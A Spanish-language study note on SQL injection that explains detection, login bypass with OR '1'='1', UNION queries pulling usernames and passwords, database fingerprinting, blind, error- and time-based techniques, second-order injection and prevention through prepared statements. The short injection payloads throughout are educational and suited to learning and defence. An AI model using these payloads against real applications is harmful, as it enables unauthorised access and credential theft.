# Inyecciones SQLi (SQL Injection)

## ¿Qué es la inyección SQL?
La inyección [SQLi](SQLi.md) es una vulnerabilidad que permite a un atacante manipular las consultas SQL de una aplicación para acceder, modificar o eliminar datos en una base de datos. Se produce cuando la entrada del usuario no se valida ni se sanitiza correctamente, permitiendo la ejecución de código SQL malicioso.

---

## Cómo detectar vulnerabilidades de inyección SQL
Algunos métodos para identificar si una aplicación es vulnerable a SQLi incluyen:
- **Pruebas manuales:** Insertar caracteres especiales (`'`, `"`, `;`, `--`, `#`, etc.) en los campos de entrada y observar errores.
- **Errores de la base de datos:** Mensajes como `syntax error` pueden indicar una vulnerabilidad.
- **Automatización:** Uso de herramientas como [SQLmap](SQLmap.md) para detectar y explotar SQLi.

---

## Recuperar datos ocultos
A veces, los datos de la base de datos están ocultos, pero la inyección SQL puede revelar información oculta al modificar consultas, por ejemplo:
```sql
SELECT * FROM productos WHERE id = '1' OR '1'='1';
```

---

## Subvertir la lógica de la aplicación
Los atacantes pueden modificar consultas para eludir la autenticación:
```sql
SELECT * FROM usuarios WHERE usuario = 'admin' AND clave = '' OR '1'='1';
```
Esto permite iniciar sesión sin conocer la contraseña real.

---

## Inyección SQL UNION attacks
Permite unir múltiples consultas SQL para extraer datos de otras tablas.

### Determinar el número de columnas requeridas
```sql
ORDER BY nº; -- Probamos incrementando 'n' hasta encontrar un error
```

### Encontrar columnas con un tipo de datos útil
```sql
UNION SELECT NULL, NULL, 'texto';
```

### Uso de un ataque UNION de inyección SQL para recuperar datos interesantes
```sql
UNION SELECT nombre, clave FROM usuarios;
```

### Recuperar múltiples valores dentro de una sola columna
```sql
UNION SELECT nombre || ' - ' || clave FROM usuarios;
```

---

## Examinar la base de datos
Los atacantes pueden obtener información sobre la estructura de la base de datos.

### Identificar la base de datos en uso
```sql
SELECT @@version; -- Para MySQL
SELECT version(); -- Para PostgreSQL
SELECT banner FROM v$version; -- Para Oracle
```

### Listar tablas y columnas
```sql
SELECT table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name='usuarios';
```

---

## Inyección SQL ciega
Cuando la aplicación no devuelve errores directos, se pueden usar técnicas como:

### Explotar la inyección SQL ciega desencadenando respuestas condicionales
```sql
AND 1=1 -- [Devuelve verdadero]
AND 1=2 -- [Devuelve falso]
```

### Inyección SQL basada en errores
Forzar la aplicación a mostrar errores:
```sql
AND 1=CAST((SELECT clave FROM usuarios LIMIT 1) AS INT);
```

### Explotar la inyección SQL ciega desencadenando retrasos de tiempo
```sql
IF(1=1, SLEEP(5), 0);
```

### Explotar la inyección SQL ciega utilizando técnicas fuera de banda (OAST)
Enviar consultas a servidores externos para filtrar datos.

---

## Inyección SQL en diferentes contextos
- **En URLs:** `https://victima.com/perfil?id=1' OR '1'='1`.
- **En formularios:** Campos de login vulnerables.
- **En encabezados HTTP:** Manipulación de cookies o User-Agent.

---

## Inyección SQL de segundo orden
Los datos maliciosos se almacenan en la base de datos y ejecutan la inyección en otro contexto.

Ejemplo: Un usuario malicioso registra su nombre como:
```sql
admin' --
```
Cuando un administrador lo consulta en otra página, la inyección se ejecuta.

---

## 🛡️ Cómo prevenir la inyección SQL
✅ **Usar consultas preparadas** con `?` o `bind_param()`:
```sql
SELECT * FROM usuarios WHERE usuario = ? AND clave = ?;
```
✅ **Validar y sanitizar entradas del usuario.**
✅ **Principio de menor privilegio:** No usar cuentas con permisos excesivos.
✅ **Firewalls de aplicaciones web (WAF).**

---
**Conclusión:** La inyección SQL sigue siendo una de las vulnerabilidades más peligrosas, pero con buenas prácticas y medidas de seguridad adecuadas, se puede mitigar el riesgo de ataque.
